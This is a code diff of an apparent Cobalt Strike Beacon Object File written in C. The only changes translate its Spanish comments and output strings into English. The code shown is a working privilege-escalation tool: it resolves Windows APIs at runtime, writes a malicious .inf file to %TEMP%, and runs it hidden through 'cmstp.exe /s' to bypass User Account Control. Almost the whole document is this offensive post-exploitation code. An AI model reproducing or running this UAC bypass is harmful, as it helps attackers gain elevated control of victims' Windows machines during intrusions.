@@ -21,14 +21,14 @@
 #include "beacon.h"
 
 // ================================
-// IMPORTS DIRECTOS (solo si están en tu tabla)
+// DIRECT IMPORTS (only if they are in your table)
 // ================================
 extern PVOID __imp_LoadLibraryA;
 extern PVOID __imp_GetProcAddress;
 extern PVOID __imp_CloseHandle;
 
 // ================================
-// FUNCIÓN AUX: EJECUTAR COMANDO OCULTO
+// HELPER FUNCTION: RUN HIDDEN COMMAND
 // ================================
 void execute_hidden_cmd(char* cmd) {
     HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
@@ -48,7 +48,7 @@ void execute_hidden_cmd(char* cmd) {
         typedef DWORD (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
         WAITFORSINGLEOBJECT pWaitForSingleObject = (WAITFORSINGLEOBJECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WaitForSingleObject");
         if (pWaitForSingleObject) {
-            pWaitForSingleObject(pi.hProcess, 10000); // Esperar 10s
+            pWaitForSingleObject(pi.hProcess, 10000); // Wait 10s
         }
         ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
         ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);
@@ -56,12 +56,12 @@ void execute_hidden_cmd(char* cmd) {
 }
 
 // ================================
-// FUNCIÓN PRINCIPAL
+// MAIN FUNCTION
 // ================================
 void go(char *args, int alen) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Iniciando bypass UAC via SilentCleanup (fodhelper/CMSTP)...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Starting UAC bypass via SilentCleanup (fodhelper/CMSTP)...\n");
 
-    // === Paso 1: Obtener %TEMP% ===
+    // === Step 1: Get %TEMP% ===
     HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
     typedef DWORD (WINAPI *GETENVVARA)(LPCSTR, LPSTR, DWORD);
     GETENVVARA pGetEnvVarA = (GETENVVARA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "GetEnvironmentVariableA");
@@ -70,35 +70,35 @@ void go(char *args, int alen) {
     char inf_path[512] = {0};
 
     if (!pGetEnvVarA || !pGetEnvVarA("TEMP", temp_path, sizeof(temp_path))) {
-        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo obtener %%TEMP%%\n");
+        BeaconPrintf(CALLBACK_ERROR, "[UAC] Could not get %%TEMP%%\n");
         return;
     }
 
-    // === Paso 2: Formatear ruta del .inf ===
+    // === Step 2: Format the .inf path ===
     HMODULE hUser32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("user32.dll");
     typedef int (WINAPI *WSPRINTFA)(LPSTR, LPCSTR, ...);
     WSPRINTFA pwsprintfA = (WSPRINTFA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hUser32, "wsprintfA");
     if (!pwsprintfA) {
-        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo resolver wsprintfA\n");
+        BeaconPrintf(CALLBACK_ERROR, "[UAC] Could not resolve wsprintfA\n");
         return;
     }
 
     pwsprintfA(inf_path, "%s\\uac_bypass.inf", temp_path);
 
-    // === Paso 3: Crear archivo .inf malicioso ===
+    // === Step 3: Create malicious .inf file ===
     typedef HANDLE (WINAPI *CREATEFILEA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
     CREATEFILEA pCreateFileA = (CREATEFILEA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateFileA");
     typedef BOOL (WINAPI *WRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
     WRITEFILE pWriteFile = (WRITEFILE)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WriteFile");
 
     if (!pCreateFileA || !pWriteFile) {
-        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudieron resolver CreateFileA/WriteFile\n");
+        BeaconPrintf(CALLBACK_ERROR, "[UAC] Could not resolve CreateFileA/WriteFile\n");
         return;
     }
 
     HANDLE hFile = pCreateFileA(inf_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo crear %s\n", inf_path);
+        BeaconPrintf(CALLBACK_ERROR, "[UAC] Could not create %s\n", inf_path);
         return;
     }
 
@@ -114,14 +114,14 @@ void go(char *args, int alen) {
     pWriteFile(hFile, inf_content, strlen(inf_content), &written, NULL);
     ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hFile);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Archivo .inf creado: %s\n", inf_path);
+    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] .inf file created: %s\n", inf_path);
 
-    // === Paso 4: Ejecutar con CMSTP (bypass UAC) ===
+    // === Step 4: Run with CMSTP (UAC bypass) ===
     char cmd[1024];
     pwsprintfA(cmd, "cmstp.exe /s \"%s\"", inf_path);
-    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Ejecutando: %s\n", cmd);
+    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Running: %s\n", cmd);
     execute_hidden_cmd(cmd);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Comando ejecutado con privilegios elevados (si UAC fue bypassed)\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Verifica: %s\\uac_success.txt\n", temp_path);
+    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Command executed with elevated privileges (if UAC was bypassed)\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Check: %s\\uac_success.txt\n", temp_path);
 }
